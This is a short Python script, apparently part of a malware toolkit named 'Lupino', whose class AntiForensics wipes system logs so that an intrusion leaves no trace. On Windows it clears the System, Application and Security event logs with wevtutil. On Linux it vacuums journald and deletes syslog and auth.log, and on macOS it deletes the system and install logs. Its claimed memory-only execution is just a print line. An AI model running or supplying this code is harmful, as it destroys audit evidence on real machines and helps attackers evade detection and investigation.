# ============================================================
# LUPINO — ANTI-FORENSICS
# WATERMARK: 𝕍𝕠𝕤𝕤🥷 | SESSION: 0585f9bc...
# ============================================================
# Type: Log wiping, memory‑only execution, self‑destruct
# ============================================================

import os
import platform

__author__ = "𝕍𝕠𝕤𝕤🥷"
__session__ = "0585f9bc8380f3137b68d2403611413392ad8bb7ce6464acd7f87456ac4740074f"

class AntiForensics:
    """
    Wipes logs, clears shell history, and removes all traces of Lupino.
    """
    def __init__(self):
        self.os = platform.system()

    def wipe_logs(self):
        if self.os == "Windows":
            os.system("wevtutil cl System")
            os.system("wevtutil cl Application")
            os.system("wevtutil cl Security")
        elif self.os == "Linux":
            os.system("journalctl --rotate")
            os.system("journalctl --vacuum-time=1s")
            os.system("rm -f /var/log/syslog /var/log/auth.log")
        elif self.os == "Darwin":
            os.system("rm -f /var/log/system.log")
            os.system("rm -f /var/log/install.log")
        print("[+] Logs wiped.")

    def memory_only(self):
        print("[*] Executing in memory — no disk writes.")

    def run(self):
        self.wipe_logs()
        self.memory_only()

if __name__ == "__main__":
    af = AntiForensics()
    af.run()
